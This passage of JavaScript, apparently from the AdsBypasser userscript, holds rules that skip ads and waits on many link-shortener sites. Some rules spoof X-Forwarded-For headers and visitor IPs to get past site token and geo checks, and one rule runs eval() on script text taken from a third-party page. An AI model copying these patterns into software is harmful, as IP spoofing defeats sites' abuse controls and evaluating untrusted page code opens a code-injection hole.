  }
  var Encode = function (str) {
    var s = [], j = 0, x, res = '', k = arguments.callee.toString().replace(/\s+/g, "");
    for (var i = 0; i < 256; i++) {
      s[i] = i;
    }
    for (i = 0; i < 256; i++) {
      j = (j + s[i] + k.charCodeAt(i % k.length)) % 256;
      x = s[i];
      s[i] = s[j];
      s[j] = x;
    }
    i = 0;
    j = 0;
    for (var y = 0; y < str.length; y++) {
      i = (i + 1) % 256;
      j = (j + s[i]) % 256;
      x = s[i];
      s[i] = s[j];
      s[j] = x;
      res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
    }
    return res;
  };
  var hostRules = [
    /^(([\w]{8}|www)\.)?(allanalpass|cash4files|drstickyfingers|fapoff|freegaysitepass|(gone|tube)viral|(pic|tna)bucks|whackyvidz|fuestfka)\.com$/,
    /^(([\w]{8}|www)\.)?(a[mn]y|deb|dyo|sexpalace)\.gs$/,
    /^(([\w]{8}|www)\.)?(filesonthe|poontown|seriousdeals|ultrafiles|urlbeat|zatnawqy|zytpirwai|jzrputtbut)\.net$/,
    /^(([\w]{8}|www)\.)?freean\.us$/,
    /^(([\w]{8}|www)\.)?galleries\.bz$/,
    /^(([\w]{8}|www)\.)?hornywood\.tv$/,
    /^(([\w]{8}|www)\.)?link(babes|bucks)\.com$/,
    /^(([\w]{8}|www)\.)?(megaline|miniurls|qqc|rqq|tinylinks|yyv|zff)\.co$/,
    /^(([\w]{8}|www)\.)?(these(blog|forum)s)\.com$/,
    /^(([\w]{8}|www)\.)?youfap\.me$/,
    /^warning-this-linkcode-will-cease-working-soon\.www\.linkbucksdns\.com$/,
  ];
  (function () {
    'use strict';
    function findToken (context) {
      var script = $.searchScripts('    var f = window[\'init\' + \'Lb\' + \'js\' + \'\']', context);
      if (!script) {
        _.warn('pattern changed');
        return null;
      }
      var adurl = script.match(/AdUrl\s*:\s*'([^']+)'/);
      if (!adurl) {
        return null;
      }
      adurl = adurl[1];
      var m1 = script.match(/AdPopUrl\s*:\s*'.+\?[^=]+=([\w\d]+)'/);
      var m2 = script.match(/Token\s*:\s*'([\w\d]+)'/);
      var token = m1[1] || m2[1];
      var m = script.match(/=\s*(\d+);/);
      var ak = parseInt(m[1], 10);
      var re = /\+\s*(\d+);/g;
      var tmp = null;
      while((m = re.exec(script)) !== null) {
        tmp = m[1];
      }
      ak += parseInt(tmp, 10);
      return {
        t: token,
        aK: ak,
        adurl: adurl,
      };
    }
    function sendRequest (token) {
      $.get(token.adurl);
      delete token.adurl;
      token.a_b = false;
      _.info('waiting the interval');
      return _.wait(5000).then(function () {
        _.info('sending token: %o', token);
        return $.get('/intermission/loadTargetUrl', token, {
          'X-Requested-With': _.none,
          Origin: _.none,
        });
      }).then(function (text) {
        var data = _.parseJSON(text);
        _.info('response: %o', data);
        if (!data.Success && data.Errors[0] === 'Invalid token') {
          _.warn('got invalid token');
          return retry();
        }
        if (data.AdBlockSpotted) {
          _.warn('adblock spotted');
          return;
        }
        if (data.Success && !data.AdBlockSpotted && data.Url) {
          return data.Url;
        }
      });
    }
    function retry () {
      return $.get(window.location.toString(), {}, {
        'X-Forwarded-For': $.generateRandomIP(),
      }).then(function (text) {
        var d = $.toDOM(text);
        var t = findToken(d);
        if (!t) {
          return _.wait(1000).then(retry);
        }
        return sendRequest(t);
      });
    }
    $.register({
      rule: {
        host: hostRules,
        path: /^\/\w+\/url\/(.+)$/,
      },
      ready: function(m) {
        $.removeAllTimer();
        $.resetCookies();
        $.removeNodes('iframe');
        var url = m.path[1] + window.location.search;
        var match = $.searchScripts(/UrlEncoded: ([^,]+)/);
        if (match && match[1] === 'true') {
          url = Encode(ConvertFromHex(url));
        }
        $.openLink(url);
      }
    });
    $.register({
      rule: {
        host: hostRules,
      },
      start: function () {
        $.window.XMLHttpRequest = _.nop;
      },
      ready: function () {
        $.removeAllTimer();
        $.resetCookies();
        $.removeNodes('iframe');
        if (window.location.pathname.indexOf('verify') >= 0) {
          var path = window.location.pathname.replace('/verify', '');
          $.openLink(path);
          return;
        }
        var token = findToken(document);
        sendRequest(token).then(function (url) {
          $.nuke(url);
          $.openLink(url);
        });
      },
    });
    $.register({
      rule: {
        query: /^(.*)[?&]_lbGate=\d+$/,
      },
      start: function (m) {
        $.setCookie('_lbGatePassed', 'true');
        $.openLink(window.location.pathname + m.query[1]);
      },
    });
  })();
})();
$.register({
  rule: {
    host: [
      /^www\.linkdecode\.com$/,
      /^www\.fastdecode\.com$/,
    ],
    path: /^\/$/,
    query: /^\?(.+)$/,
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var lnk = m.query[1];
    if (m.query[1].match(/^https?:\/\//)) {
    	$.openLink(lnk);
    	return;
    }
    var b = $.$('#popup');
    if (b && b.href) {
      $.openLink(b.href);
      return;
    }
    b = $('#m > .Visit_Link');
    b = b.onclick.toString().match(/window\.open\(\'([^']+)\'/);
    if (!b) {
      throw new _.AdsBypasser('pattern changed');
    }
    lnk = b[1].match(/\?(https?:\/\/.*)$/);
    if (lnk) {
        $.openLink(lnk[1]);
        return;
    }
    $.openLink(b[1]);
  },
});
$.register({
  rule: {
    host: /^linkdolar\.xyz$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var s = $.searchScripts(/^\s*eval\((.+)\)\s*$/);
    if (!s) {
      _.warn('site changed');
      return;
    }
    s = eval('(' + s[1] + ')');
    s = s.match(/\$\.post\('([^']+)',(\{.+\}),function/);
    if (!s) {
      _.warn('site changed');
    }
    var url = s[1];
    var args = eval('(' + s[2] + ')');
    $.post(url, args).then(function (target) {
      $.openLink(target);
    });
  },
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: [
        /^(www\.)?linkdrop\.net$/,
        /^dmus\.in$/,
        /^ulshare\.net$/,
        /^adurl\.id$/,
        /^goolink\.me$/,
        /^earningurl\.com$/,
      ],
    },
    ready: function () {
      $.removeNodes('iframe');
      var f = getForm();
      if (!f) {
        return;
      }
      sendRequest(f);
    },
  });
  $.register({
    rule: {
      host: /^sflnk\.me$/,
    },
    ready: function () {
      $.removeNodes('iframe');
      var f = getForm();
      if (!f) {
        f = $('#link-view');
        f.submit();
        return;
      }
      sendRequest(f);
    },
  });
  function getForm () {
    var jQuery = $.window.$;
    var f = jQuery('form[action="/links/go"], form[action="/links/linkdropgo"]');
    if (f.length > 0) {
      return f;
    }
    return null;
  }
  function sendRequest (f) {
    var jQuery = $.window.$;
    jQuery.ajax({
      dataType: 'json',
      type: 'POST',
      url: f.attr('action'),
      data: f.serialize(),
      success: function (result, status, xhr) {
        if (result.url) {
          $.openLink(result.url);
        } else {
          _.warn(result.message);
        }
      },
      error: function (xhr, status, error) {
        _.warn(xhr, status, error);
      },
    });
  }
})();
$.register({
  rule: {
    host: /^linkpaid\.net$/,
    path: /^\/go\//,
  },
  ready: function () {
    'use strict';
    var f = $('#btn-main');
    f.click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?linkplugapp\.com$/,
  },
  ready: function () {
    'use strict'
    var a = $('#mc_embed_signup_scroll a')
    $.openLink(a.href)
  },
})
$.register({
  rule: {
    host: /^linksas\.us$/,
    path: /^(\/\w+)$/,
  },
  ready: function (m) {
    'use strict';
    _.try(1000, function () {
      var recaptcha = $('#g-recaptcha-response');
      if (!recaptcha) {
        return null;
      }
      if (!recaptcha.value) {
        return _.none;
      }
      return recaptcha.value;
    }).then(function (recaptcha) {
      var url = _.T('http://ipinfo.io/{0}/json')($.generateRandomIP());
      return $.get(url).then(function (ipinfo) {
        ipinfo = _.parseJSON(ipinfo);
        return {
          codeAds: 1,
          country: ipinfo.country,
          ipAddress: ipinfo.ip,
          recaptcha: recaptcha,
        };
      });
    }).then(function (payload) {
      var token = $.getCookie('XSRF-TOKEN');
      return $.post('/go' + m.path[1], payload, {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': token,
      });
    }).then(function (data) {
      data = _.parseJSON(data);
      $.openLink(data.message);
    }).catch(function (e) {
      _.warn(e);
    });
  },
});
$.register({
  rule: {
    host: /^linksas\.us$/,
    path: /^\/go\//,
  },
  ready: function () {
    'use strict';
    var a = $.$('#btnSubmit');
    if (!a) {
      return;
    }
    var url = a.href;
    var pattern = /https?:\/\//g;
    var lastURL = '';
    while (true) {
      var matched = pattern.exec(url);
      if (!matched) {
        break;
      }
      lastURL = matched + url.substring(pattern.lastIndex);
    }
    $.openLink(lastURL);
  },
});
$.register({
  rule: {
    host: /^linkshrink\.net$/,
    path: /^\/[a-zA-Z0-9]+$/,
  },
  start: function () {
    'use strict';
    $.window._impspcabe = 0;
  },
  ready: function () {
    'use strict';
    var l = $.searchScripts(/revC\("([^"]+)"\)/);
    l = atob(l[1]);
    $.openLink('/' + l);
  },
});
$.register({
  rule: {
    host: /^linkshrink\.net$/,
    path: /=(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.path[1]);
  },
});
$.register({
  rule: 'http://lix.in/-*',
  ready: function () {
    'use strict';
    var i = $.$('#ibdc');
    if (i) {
      return;
    }
    i = $.$('form');
    if (i) {
      i.submit();
      return;
    }
    i = $('iframe');
    $.openLink(i.src);
  },
});
$.register({
  rule: {
    host: /^lnk\.in$/,
  },
  ready: function () {
    'use strict';
    var a = $('#divRedirectText a');
    $.openLink(a.innerHTML);
  },
});
$.register({
  rule: {
    host: /^(rd?)lnk\.co|reducelnk\.com$/,
    path: /^\/[^.]+$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('iframe#dest');
    if (f) {
      $.openLink(f.src);
      return;
    }
    $.removeNodes('iframe');
    var o = $.$('#urlholder');
    if (o) {
      $.openLink(o.value);
      return;
    }
    o = $.$('#skipBtn');
    if (o) {
      o = o.querySelector('a');
      $.openLink(o.href);
      return;
    }
    o = document.title.replace(/(LNK.co|Linkbee)\s*:\s*/, '');
    $.openLink(o);
  },
});
$.register({
  rule: {
    host: [
      /^lnx\.lu$/,
      /^url\.fm$/,
      /^z\.gs$/,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('#clickbtn a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^www\.lolinez\.com$/,
    query: /\?(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?loook\.ga$/,
    path: /^\/\d+$/
  },
  ready: function (m) {
    'use strict';
    var a = $('#download_link > a.btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^looy\.in$/,
    path: /^\/Pro\/(.+)$/,
  },
  ready: function (m) {
    'use strict';
    $.post('http://looy.in/Go/Index/ProSkipAd', {
      code: m.path[1],
      server: '',
    }).then(function (url) {
      $.openLink(url);
    }).catch(function (e) {
      _.warn(e);
    });
  },
});
$.register({
  rule: {
    host: /^looy\.in$/,
    path: /^\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/Pro/' + m.path[1]);
  },
});
$.register({
  rule: [
    'http://madlink.sk/',
    'http://madlink.sk/*.html',
  ],
});
$.register({
  rule: 'http://madlink.sk/*',
  start: function (m) {
    'use strict';
    $.removeNodes('iframe');
    $.post('/ajax/check_redirect.php', {
      link: m[1],
    }).then(function (text) {
      $.openLink(text);
    });
  },
});
$.register({
  rule: {
    host: [
      /^mant[ae][pb]\.in$/,
      /^st\.oploverz\.net$/,
      /^minidroid\.net$/,
      /^ww3\.awaremmxv\.com$/,
      /^linkpoi\.in$/,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('a.redirect, a[target=_blank][rel=nofollow]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^susutin\.com$/,
  },
  ready: function () {
    'use strict';
    var s = $.searchScripts(/="([^"]+)",/);
    $.openLink(s[1]);
  },
});
$.register({
  rule: {
    host: /^www\.mije\.net$/,
    path: /^\/\w+\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^mirrorfilehost\.com$/,
  },
  ready: function () {
    'use strict';
    _.wait(3 * 1000).then(function () {
      var frame = frames[0];
      var form = frame.document.createElement('form');
      form.target = '_parent';
      form.action = location.toString();
      var input = frame.document.createElement('input');
      input.value = 'Download';
      input.type = 'submit';
      form.appendChild(input);
      frame.document.body.appendChild(form);
      input.click();
    });
  },
});
$.register({
  rule: {
    host: [
      /^moe\.god\.jp$/,
      /^moesubs\.akurapopo\.pro$/,
      /^dl\.nsfk\.in$/,
    ]
  },
  ready: function () {
    'use strict';
    var a = $('div div center a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^moesubs\.com$/,
    path: /^\/url\//,
  },
  ready: function () {
    'use strict';
    var a = $('body > div:nth-child(4) > i:nth-child(1)');
    a = a.textContent;
    var i = a.lastIndexOf('http');
    a = a.substr(i);
    $.openLink(a);
  },
});
$.register({
  rule: {
    host: /^mt0\.org$/,
    path: /^\/[^\/]+\/$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('frame[name=bottom]');
    var f = $('frame[name=top]');
    var i = setInterval(function () {
      var a = $.$('div a', f.contentDocument);
      if (!a) {
        return;
      }
      clearInterval(i);
      $.openLink(a.href)
    }, 1000);
  },
});
$.register({
  rule: 'http://my-link.pro/*',
  ready: function () {
    'use strict';
    var i = $('iframe[scrolling=auto]');
    if (i) {
      $.openLink(i.src);
    }
  },
});
$.register({
  rule: {
    host: /^nmac\.to$/,
    path: /^\/download\/(.+)/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^nsfw\.in$/,
  },
  ready: function () {
    'use strict';
    var a = $('#long_url a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^nutshellurl\.com$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('iframe');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?ohleech\.com$/,
    path: /^\/dl\/$/,
  },
  ready: function () {
    'use strict';
    $.window.startdl();
  },
});
$.register({
  rule: {
    host: /^www\.oni\.vn$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var data = $.searchScripts(/data:"([^"]+)"/);
    if (!data) {
      throw new _.AdsBypasserError('pattern changed');
    }
    data = data[1];
    $.get('/click.html', data).then(function (url) {
      $.openLink(url);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?ouo\.(io|press)$/,
    path: /^\/go\/\w+$/,
  },
  ready: function (m) {
    'use strict';
    $('form').submit();
  },
});
$.register({
  rule: {
    host: /^oxyl\.me$/,
  },
  ready: function () {
    'use strict';
    var l = $.$$('.links-container.result-form > a.result-a');
    if (l.size() > 1) {
      return;
    }
    $.openLink(l.at(0).href);
  },
});
$.register({
  rule: {
    host: /^p\.pw$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var m = $.searchScripts(/window\.location = "(.*)";/);
    m = m[1];
    $.openLink(m);
  },
});
$.register({
  rule: {
    host: /^pdi2\.net$/,
  },
  ready: function () {
    'use strict';
    var s = $.searchScripts(/top\.location = '([^']+)'/);
    s = s[1];
    $.openLink(s);
  },
});
$.register({
  rule: {
    host: /^(www\.)?\w+\.rapeit\.net$/,
    path: /^\/(go|prepair|request|collect|analyze)\/[a-f0-9]+$/,
  },
  ready: function (m) {
    'use strict';
    var a = $('a#download_link');
    $.openLink(a.href);
  },
});
$.register({
  rule: 'http://reffbux.com/refflinx/view/*',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var m = $.searchScripts(/skip_this_ad_(\d+)_(\d+)/);
    var id = m[1];
    var share = m[2];
    var location = window.location.toString();
    $.post('http://reffbux.com/refflinx/register', {
      id: id,
      share: share,
      fp: 0,
      location: location,
      referer: '',
    }).then(function (text) {
      var m = text.match(/'([^']+)'/);
      if (!m) {
        throw new _.AdsBypasserError('pattern changed');
      }
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: 'http://richlink.com/app/webscr?cmd=_click&key=*',
  ready: function () {
    'use strict';
    var f = $('frameset');
    f = f.onload.toString();
    f = f.match(/url=([^&]+)/);
    if (f) {
      f = decodeURIComponent(f[1]);
    } else {
      f = $('frame[name=site]');
      f = f.src;
    }
    $.openLink(f);
  },
});
$.register({
  rule: 'http://rijaliti.info/*.php',
  ready: function () {
    'use strict';
    var a = $('#main td[align="center"] a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^riurl\.com$/,
    path: /^\/.+/,
  },
  ready: function () {
    'use strict';
    var s = $.$('body script');
    if (s) {
      s = s.innerHTML.indexOf('window.location.replace');
      if (s >= 0) {
        return;
      }
    }
    $.openLink('', {
      path: {
        hidden: '1',
        image: ' ',
      },
    });
  },
});
$.register({
  rule: {
    host: /^preview\.rlu\.ru$/,
  },
  ready: function () {
    'use strict';
    var a = $('#content > .long_url > a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^robo\.us$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var url = atob($.window.fl);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^www\.ron\.vn$/,
  },
  ready: function () {
    'use strict';
    var script = $.searchScripts('linknexttop');
    var data = script.match(/data:"([^"]+)"/);
    var url = $.window.domain + 'click.html?' + data[1];
    $.get(url, {}, {
      'Content-Type': 'application/json; charset=utf-8',
    }).then(function (url) {
      $.openLink(url);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?sa\.ae$/,
    path: /^\/\w+\/$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var real_link = '([^']+)';/);
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?safeurl\.eu$/,
    path: /\/\w+/,
  },
  ready: function () {
    'use strict';
    var directUrl = $.searchScripts(/window\.open\("([^"]+)"\);/);
    if (!directUrl) {
      throw new _.AdsBypasserError('script content changed');
    }
    directUrl = directUrl[1];
    $.openLink(directUrl);
  },
});
$.register({
  rule: {
    host: [
      /^segmentnext\.com$/,
      /^(www\.)?videogamesblogger.com$/,
    ],
    path: /^\/interstitial\.html$/,
    query: /return_url=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(decodeURIComponent(m.query[1]));
  },
});
$.register({
  rule: {
    host: /^(www\.)?(apploadz\.ru|seomafia\.net)$/
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var a = $('table a');
    $.openLink(a.href);
  },
});
$.register({
  rule: /http:\/\/setlinks\.us\/(p|t|d).*/,
  ready: function () {
    'use strict';
    var k = $.searchScripts(/window\.location='([^']+)'/);
    if (k) {
      $.openLink(k[1]);
      return;
    }
    var aLinks = $.$$('div.links-container.result-form:not(.p-links-container) > span.dlinks > a');
    if (aLinks.size() === 1) {
      $.openLink(aLinks.at(0).href);
      return;
    }
    k = $('img[alt=captcha]');
    $.captcha(k.src, function (a) {
      var b = $('#captcha');
      var c = $('input[name=Submit]');
      b.value = a;
      c.click();
    });
  },
});
(function () {
  'use strict';
  function afterGotSessionId (sessionId) {
    var X_NewRelic_ID = $.searchScripts(/xpid:"([^"]+)"/);
    var data = {
      adSessionId: sessionId,
    };
    var header = {
      Accept: 'application/json, text/javascript',
    };
    if (X_NewRelic_ID) {
      header['X-NewRelic-ID'] = X_NewRelic_ID;
    }
    var i = setInterval(function () {
      $.get('/shortest-url/end-adsession', data, header).then(function (text) {
        var r = _.parseJSON(text);
        if (r.status == "ok" && r.destinationUrl) {
          clearInterval(i);
          $.removeAllTimer();
          var url = decodeURIComponent(r.destinationUrl);
          $.openLink(url);
        }
      });
    }, 1000);
  }
  var hostRules = [
    /^sh\.st$/,
    /^(dh10thbvu|u2ks|jnw0|qaafa|xiw34|cllkme|clkmein|corneey|ceesty)\.com$/,
    /^[dfg]estyy\.com$/,
    /^digg\.to$/,
    /^([vw]iid|clkme)\.me$/,
    /^short\.est$/,
  ];
  $.register({
    rule: {
      host: hostRules,
      path: /^\/freeze\/.+/,
    },
    ready: function () {
      var o = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          if (mutation.target.getAttribute('class').match(/active/)) {
            o.disconnect();
            $.openLink(mutation.target.href);
          }
        });
      });
      o.observe($('#skip_button'), {
        attributes: true,
        attributeFilter: ['class'],
      });
    },
  });
  $.register({
    rule: {
      host: hostRules,
      path: /https?:\/\//,
    },
    start: function () {
      var url = window.location.pathname + window.location.search + window.location.hash;
      url = url.match(/(https?:\/\/.*)$/);
      url = url[1];
      $.openLink(url);
    },
  });
  $.register({
    rule: {
      host: hostRules,
      path: /^\/[\d\w]+/,
    },
    start: function () {
      $.window._impspcabe = 0;
    },
    ready: function () {
      $.removeNodes('iframe');
      $.removeAllTimer();
      var m = $.searchScripts(/sessionId: "([\d\w]+)",/);
      if (m) {
        afterGotSessionId(m[1]);
        return;
      }
      var o = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          var m = $.searchScripts(/sessionId: "([\d\w]+)",/);
          if (m) {
            o.disconnect();
            afterGotSessionId(m[1]);
          }
        });
      });
      o.observe(document.body, {
        childList: true,
      });
    },
  });
})();
$.register({
  rule: {
    host: [
      /^(www\.)?shink\.in$/,
      /^fas\.li$/,
      /^(www\.)?croco\.(me|site)$/,
      /^cpmlink\.net$/,
    ],
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('#skip');
    if (!$.$('#captcha')) {
      f.submit();
      return;
    }
    var o = new MutationObserver(function (mutations) {
      mutations.forEach(function (mutation) {
        mutation.addedNodes.forEach(function (node) {
          if (node.localName === 'div') {
            if (node.style.zIndex === '2147483647') {
              node.parentNode.removeChild(node);
              return;
            }
          }
        });
      });
    });
    o.observe(document.body, {
      childList: true,
      subtree: true,
    });
  },
});
$.register({
  rule: [
    {
      host: [
        /^fas\.li$/,
        /^cpmlink\.net$/,
      ],
      path: /^\/go\/\w+$/,
    },
    {
      host: /^(www\.)?croco\.(me|site)$/,
      path: /^\/ok\/\w+$/,
    },
  ],
  ready: function () {
    'use strict';
    var a = $('#btn-main');
    var i = a.href.lastIndexOf('http');
    a = a.href.substr(i);
    $.openLink(a);
  },
});
$.register({
  rule: {
    host: /^(www\.)?shink\.in$/,
    path: /^\/go\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('#skip');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^short\.am$/,
  },
  ready: function () {
    'use strict';
    _.wait(5000).then(function () {
      $.openLink('', {
        post: {
          image: 'Continue',
        },
      });
    });
  },
});
$.register({
  rule: {
    host: [
      /^(www\.)?shortenurl\.tk$/,
      /^(www\.)?pengaman\.link$/,
      /^urlgo\.gs$/,
      /^gunting\.web\.id$/,
    ],
    path: /^\/\w+$/,
  },
  ready: function (m) {
    'use strict';
    var l = $('a.btn-block.redirect');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?shorti\.ga$/,
    path: [
      /^\/\w+$/,
      /^\/url_redirector\.html$/,
    ],
  },
  ready: function () {
    'use strict';
    var f = $.$$('frame');
    var fl = f.find(function(value, key, self) {
      if (value.getAttribute('class')) {
        return _.none;
      }
      return 'Target frame found';
    });
    $.openLink(fl.value.src);
  },
});
$.register({
  rule: {
    host: /^www\.shortskip\.com$/,
    path: /^\/short\.php$/,
    query: /i=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    var url = decodeURIComponent(m.query[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^get\.shrink-service\.it$/,
    path: /^\/(.+)/,
  },
  start: function (m) {
    'use strict';
    var url = _.T('//www.shrink-service.it/shrinked/{0}');
    $.openLink(url(m.path[1]));
  },
});
$.register({
  rule: {
    host: /^www\.shrink-service\.it$/,
    path: /^\/shrinked\//,
  },
  ready: function () {
    'use strict';
    var i = $('input[id][name]');
    $.openLink(i.value);
  },
});
$.register({
  rule: {
    host: /^www\.shrink-service\.it$/,
    path: /^\/[se]\//,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('body > input[id][name]');
    $.openLink(i.value);
  },
});
$.register({
  rule: {
    host: /^sht\.io$/,
    path: /^\/\d+\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    url = url.match(/\{sht-io\}(.+)\{sht-io\}.*\{sht-io\}/);
    $.openLink(url[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?similarsites\.com$/,
    path: /^\/goto\/([^?]+)/
  },
  start: function (m) {
    'use strict';
    var l = m.path[1];
    if (!/^https?:\/\//.test(l)) {
      l = 'http://' + l;
    }
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^smll\.io$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/window\.location="([^"]*)";/);
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^www\.spaste\.com$/,
    path: /^\/go\/\w+$/,
  },
  ready: function () {
    'use strict';
    var id = $.searchScripts(/\{id:'(\d+)'\}/);
    _.wait(3000).then(function () {
      return $.post('/site/getRedirectLink', {
        id: id,
      }).then(function (url) {
        $.openLink(url);
      });
    });
  },
});
$.register({
  rule: {
    host: /^srnk\.co$/,
    path: /^\/i\//,
  },
  ready: function () {
    'use strict';
    var a = $.$('#btn-with-link');
    if (!a) {
      return;
    }
    var href = a.href;
    var method = a.dataset.method;
    if (method) {
      var csrfParam = $('meta[name="csrf-param"]').content;
      var csrfToken = $('meta[name="csrf-token"]').content;
      var form = document.createElement('form');
      form.method = 'post';
      form.action = href;
      var input = document.createElement('input');
      input.name = '_method';
      input.value = method;
      form.appendChild(input);
      input = document.createElement('input');
      input.name = csrfParam;
      input.value = csrfToken;
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
      return;
    }
    $.post(location.pathname + '.js').then(function (script) {
      var m = script.match(/var link = "([^"]+)";/);
      if (!m) {
        _.warn('script changed');
        return;
      }
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: {
    host: /^stash-coins\.com$/,
  },
  start: function () {
    'use strict';
    var url = window.location.toString();
    var i = url.lastIndexOf('http');
    url = url.substr(i);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^streamingfrench\.net$/,
    path: /^\/$/,
    query: /^\?xb=(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = decodeURIComponent(m.query[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^(www\.)?supercheats\.com$/,
    path: /^\/interstitial\.html$/,
    query: /(?:\?|&)oldurl=([^&]+)(?:$|&)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: [
    {
      host: [
        /^(www\.)?sylnk\.net$/,
        /^dlneko\.(com|net|org)$/,
        /^rumahsimpel\.com$/,
      ],
      query: /link=([^&]+)/,
    },
    {
      host: /^(www\.)?compul\.in$/,
      path: /^\/[np]\.php$/,
      query: /v=([^&]+)/,
    },
    {
      host: /^(www\.)?safelinkair\.com$/,
      path: /^\/code$/,
      query: /(?:\?|&)link=([a-zA-Z0-9\/=]+)(?:$|&)/,
    },
    {
      host: [
        /^link\.filmku\.net$/,
        /^www\.healthygress24\.ga$/,
        /^kombatch\.amankan\.link$/,
      ],
      path: /^\/p\/(go|healty-lie)\.html$/,
      query: /^\?url=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: [
        /^(gadget|auto|sports)14\.pw$/,
        /^motosport\.pw$/,
        /^nar-04\.tk$/,
        /^lindung\.in$/,
        /^motonews\.club$/,
        /^ww[23]\.picnictrans\.com$/,
        /^gadget13\.com$/,
        /^azhie\.net$/,
        /^ww2\.awsubs\.co$/,
        /^autorp\.us$/
      ],
      query: /^\?d=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: /^www\.anisubsia\.tk$/,
      path: /^\/p\/link\.html$/,
      query: /^\?url=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: [
        /^www\.insurance1\.tech$/,
        /^www\.freeanimeonline\.xyz$/,
      ],
      query: /^\?site=([a-zA-Z0-9\/=]+)/,
    },
    {
      host: /^i\.gtaind\.com$/,
      query: /^\?([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: /\.blogspot\.com?/,
      query: [
        /^\?url=([a-zA-Z0-9\/=]+)$/,
        /^\?id=([a-zA-Z0-9\/=]+)$/,
      ],
    },
    {
      host: /^sehatlega\.com$/,
      query: /^\?lanjut=([a-zA-Z0-9\/=]+)$/,
    },
    {
      host: /^shorten\.id$/,
      query: /^\?url=([a-zA-Z0-9\/=]+)=$/,
    },
  ],
  start: function (m) {
    'use strict';
    var rawLink = atob(m.query[1]);
    $.openLink(rawLink);
  },
});
$.register({
  rule: [
    {
      host: [
        /(^|\.)safelinkconverter2?\.com$/,
        /^safelink(s?review(er)?)\.com?$/,
        /^susutin\.com$/,
        /^(getcomics|miuitutorial)\.gq$/,
        /^awsubs\.cf$/,
        /^awsubsco\.ga$/,
      ],
      query: /id=([\w\\]+=*)/,
    },
    {
      host: [
        /^(www\.)?dlneko\.com$/,
        /^(satuasia|tawaku)\.com$/,
        /^ww3\.manteb\.in$/,
        /^link\.filmku\.net$/,
        /^www\.muucih\.com$/,
        /^(naisho|filmku)\.lompat\.in$/,
        /^edogawa\.lon\.pw$/,
        /^telolet\.in$/,
      ],
      query: /go=([\w\\]+=*)/,
    },
  ],
  start: function (m) {
    'use strict';
    var l = atob(m.query[1]);
    var table = {
      '!': 'a',
      ')': 'e',
      '_': 'i',
      '(': 'o',
      '*': 'u',
    };
    l = l.replace(/[!)_(*]/g, function (m) {
      return table[m];
    });
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^(www\.)?safelinkreview\.com$/,
    path: /^\/\w+\/cost\/([\w\.]+)\/?$/,
  },
  start: function (m) {
    'use strict';
    var l = 'http://' + m.path[1];
